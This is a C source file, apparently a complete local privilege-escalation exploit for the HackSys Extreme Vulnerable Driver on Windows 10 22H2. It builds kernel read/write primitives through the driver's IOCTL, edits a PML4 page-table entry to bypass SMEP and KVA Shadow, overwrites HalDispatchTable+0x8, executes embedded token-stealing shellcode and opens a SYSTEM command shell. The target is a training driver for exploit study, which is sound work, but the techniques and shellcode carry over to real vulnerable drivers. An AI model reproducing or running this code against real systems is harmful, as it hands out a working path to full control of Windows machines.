#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <psapi.h>

// https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b02b6ea/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h#L84
#define HEVD_IOCTL_ARBITRARY_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

// https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b02b6ea/Driver/HEVD/Windows/ArbitraryWrite.h#L63-L67
typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

// HEVD Kernel Write Primitive
BOOL ArbitraryWrite(HANDLE hHevd, PVOID where, PVOID what)
{
	// https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b02b6ea/Driver/HEVD/Windows/ArbitraryWrite.c#L112
	printf("[!] Writing: *(%p) = *(%p)\n", where, what);

	PWRITE_WHAT_WHERE payload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE));
	payload->What = (PULONG_PTR)what;
	payload->Where = (PULONG_PTR)where;

	DWORD lpBytesReturned;
	return DeviceIoControl(
		hHevd,
		HEVD_IOCTL_ARBITRARY_WRITE,
		payload,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);
}

// HEVD Kernel Read Primitive
PVOID ArbitraryRead(HANDLE hHevd, PVOID addr)
{
	// Achieve ArbitraryRead by utilizing ArbitraryWrite. The ArbitraryWrite function is called
	// with a pointer to a buffer (readBuf) as the 'where' parameter, and the target read address
	// 'addr' as the 'what' parameter. This effectively reads the data from 'addr' into readBuf.
	PVOID readBuf;
	ArbitraryWrite(hHevd, &readBuf, addr);
	return readBuf;
}

// Get the device handle for HEVD
HANDLE GetHevdDeviceHandle()
{
	HANDLE hHevd = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);

	if (hHevd == INVALID_HANDLE_VALUE)
	{
		printf("[-] Driver handle: 0x%p\n", hHevd);
		printf("[-] Failed to acquire handle to the driver.\n");
		exit(1);
	}

	return hHevd;
}

// Retrieve the base address of ntoskrnl.exe
PVOID GetKernelBaseAddress()
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
	return drivers[0];
}

// Retrieve the address of the NtQueryIntervalProfile function
FARPROC GetNtQueryIntervalProfile()
{
	HMODULE ntdll = GetModuleHandle("ntdll");
	return GetProcAddress(ntdll, "NtQueryIntervalProfile");
}

// Add an offset to a pointer
PVOID AddOffsetToPointer(PVOID ptr, size_t offset)
{
	return (PVOID)((uintptr_t)ptr + offset);
}

// Allocate an executable memory area and copy code into it
PVOID AllocExecutableCode(PVOID rawCode, size_t size)
{
	PVOID executableCode = VirtualAlloc(
		NULL,
		size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	RtlMoveMemory(executableCode, rawCode, size);
	return executableCode;
}

// Extract the PML4 entry index from a virtual address
unsigned int ExtractPml4Index(PVOID address)
{
	return ((uintptr_t)address >> 39) & 0x1ff;
}

// Calculate the virtual address of the PML4 entry
PVOID CalculatePml4VirtualAddress(unsigned int pml4SelfRefIndex, unsigned int pml4Index)
{
	uintptr_t address = 0xffff;
	address = (address << 0x9) | pml4SelfRefIndex; // PML4 Index
	address = (address << 0x9) | pml4SelfRefIndex; // PDPT Index
	address = (address << 0x9) | pml4SelfRefIndex; // PDT Index
	address = (address << 0x9) | pml4SelfRefIndex; // PT Index
	address = (address << 0xC) | pml4Index * 8;    // Physical Address Offset
	return (PVOID)address;
}

// Modify the PML4 entry to be executable in kernel mode
uintptr_t ModifyPml4EntryForKernelMode(uintptr_t originalPml4Entry)
{
	uintptr_t modifiedPml4Entry = originalPml4Entry;
	modifiedPml4Entry &= ~((uintptr_t)1 << 2);  // Clear U/S bit (Kernel Mode)
	modifiedPml4Entry &= ~((uintptr_t)1 << 63); // Clear XD bit (Executable)
	return modifiedPml4Entry;
}

// Exploit Part 1: Leak the PML4 virtual address of shellcode
PVOID LeakShellcodePml4VirtualAddress(HANDLE hHevd, PVOID miGetPteAddress13_Address, PVOID shellcode)
{
	PVOID pteVirtualAddress = ArbitraryRead(hHevd, miGetPteAddress13_Address);
	printf("[*] Leaked PTE virtual address: %p\n", pteVirtualAddress);

	unsigned int pml4SelfRef_Index = ExtractPml4Index(pteVirtualAddress);
	printf("[*] Extracted PML4 Self Reference Entry index: %03x\n", pml4SelfRef_Index);

	unsigned int pml4Shellcode_Index = ExtractPml4Index(shellcode);
	printf("[*] Extracted shellcode's PML4 index: %03x\n", pml4Shellcode_Index);

	PVOID pml4Shellcode_VirtualAddress = CalculatePml4VirtualAddress(pml4SelfRef_Index, pml4Shellcode_Index);
	printf("[*] Calculated virtual address for shellcode's PML4 entry: %p\n", pml4Shellcode_VirtualAddress);

	return pml4Shellcode_VirtualAddress;
}

// Exploit Part 2: Bypass SMEP and KVA Shadow
uintptr_t BypassSMEPandKVAS(HANDLE hHevd, PVOID pml4Shellcode_VirtualAddress)
{
	uintptr_t originalPml4Shellcode_Entry = (uintptr_t)ArbitraryRead(hHevd, pml4Shellcode_VirtualAddress);
	printf("[*] Leaked shellcode's PML4 entry: %p\n", (PVOID)originalPml4Shellcode_Entry);

	uintptr_t modifiedPml4Shellcode_Entry = ModifyPml4EntryForKernelMode(originalPml4Shellcode_Entry);
	printf("[*] Modified shellcode's PML4 entry: %p\n", (PVOID)modifiedPml4Shellcode_Entry);

	ArbitraryWrite(hHevd, pml4Shellcode_VirtualAddress, &modifiedPml4Shellcode_Entry);
	printf("[*] Overwrote PML4 entry to make shellcode executable in kernel mode\n");

	return originalPml4Shellcode_Entry;
}

// Exploit Part 3: Overwrite a function pointer
PVOID OverwriteFunctionPointer(HANDLE hHevd, PVOID halDispatchTable8_Address, PVOID jmpR13_Address)
{
	PVOID originalHalDispatchTable8 = ArbitraryRead(hHevd, halDispatchTable8_Address);
	printf("[*] Leaked HalDispatchTable+0x8: %p\n", originalHalDispatchTable8);

	ArbitraryWrite(hHevd, halDispatchTable8_Address, &jmpR13_Address); // jmp r13
	printf("[*] Overwrote HalDispatchTable+0x8 to gain control flow\n");

	return originalHalDispatchTable8;
}

// Exploit Part 4: Hijack control flow
void HijackControlFlow(PVOID shellcode, FARPROC ntQueryIntervalProfileFunc)
{
	// SetR13.asm
	unsigned char rawSetR13[] = {
		0x49, 0x89, 0xcd, 0xc3
	};
	PVOID executableSetR13 = AllocExecutableCode(rawSetR13, sizeof(rawSetR13));
	printf("[*] Executable SetR13 function allocated at: %p\n", executableSetR13);

	printf("[*] Setting R13 to shellcode's address\n");
	((void (*)(PVOID))executableSetR13)(shellcode);

	printf("[*] Calling NtQueryIntervalProfile to execute shellcode\n");
	ULONG dummy = 0;
	ntQueryIntervalProfileFunc(2, &dummy);
}

// Execute arbitrary code
void ExecuteShellcode(
	PVOID shellcode,
	HANDLE hHevd,
	PVOID halDispatchTable8_Address,
	PVOID miGetPteAddress13_Address,
	PVOID jmpR13_Address,
	FARPROC ntQueryIntervalProfileFunc
)
{
	puts("\n[*] Leaking virtual address of shellcode's PML4 entry...");
	PVOID pml4Shellcode_VirtualAddress = LeakShellcodePml4VirtualAddress(hHevd, miGetPteAddress13_Address, shellcode);

	puts("\n[*] Modifying shellcode's PML4 entry to bypass SMEP and KVA Shadow...");
	uintptr_t originalPml4Shellcode_Entry = BypassSMEPandKVAS(hHevd, pml4Shellcode_VirtualAddress);

	puts("\n[*] Modifying HalDispatchTable+0x8 for shellcode execution...");
	PVOID originalHalDispatchTable8 = OverwriteFunctionPointer(hHevd, halDispatchTable8_Address, jmpR13_Address);

	puts("\n[*] Executing shellcode...");
	HijackControlFlow(shellcode, ntQueryIntervalProfileFunc);

	puts("\n[*] Restoring the kernel state...");
	ArbitraryWrite(hHevd, pml4Shellcode_VirtualAddress, &originalPml4Shellcode_Entry);
	ArbitraryWrite(hHevd, halDispatchTable8_Address, &originalHalDispatchTable8);

	puts("");
}

// Perform privilege escalation
void PrivilegeEscalation()
{
	const size_t HalDispatchTable8_Offset = 0xc00a68;
	const size_t MiGetPteAddress13_Offset = 0x26b573;
	const size_t JmpR13_Offset = 0x80d5db;

	// TokenSteal.asm
	unsigned char rawShellcode[] = {
		0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
		0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
		0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
		0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
		0x04, 0x00, 0x00, 0x4d, 0x31, 0xed, 0xc3
	};
	PVOID executableShellcode = AllocExecutableCode(rawShellcode, sizeof(rawShellcode));
	printf("[*] Executable shellcode: %p\n", executableShellcode);

	HANDLE hHevd = GetHevdDeviceHandle();
	printf("[+] HEVD device handle: %p\n", hHevd);

	PVOID kernelBaseAddress = GetKernelBaseAddress();
	printf("[+] Kernel base address: %p\n", kernelBaseAddress);

	FARPROC ntQueryIntervalProfileFunc = GetNtQueryIntervalProfile();
	printf("[+] NtQueryIntervalProfile: %p\n", ntQueryIntervalProfileFunc);

	ExecuteShellcode(
		executableShellcode,
		hHevd,
		AddOffsetToPointer(kernelBaseAddress, HalDispatchTable8_Offset),
		AddOffsetToPointer(kernelBaseAddress, MiGetPteAddress13_Offset),
		AddOffsetToPointer(kernelBaseAddress, JmpR13_Offset),
		ntQueryIntervalProfileFunc
	);
}

int main(void)
{
	puts("HackSys Extreme Vulnerable Driver (HEVD) - Arbitrary Overwrite Exploit");
	puts("Windows 10 Version 22H2 (OS Build 19045.3930) with KVA Shadow enabled");
	puts("-----\n");

	PrivilegeEscalation();

	puts("[+] Spawning a shell with SYSTEM privilege");
	system("start cmd.exe");

	return 0;
}
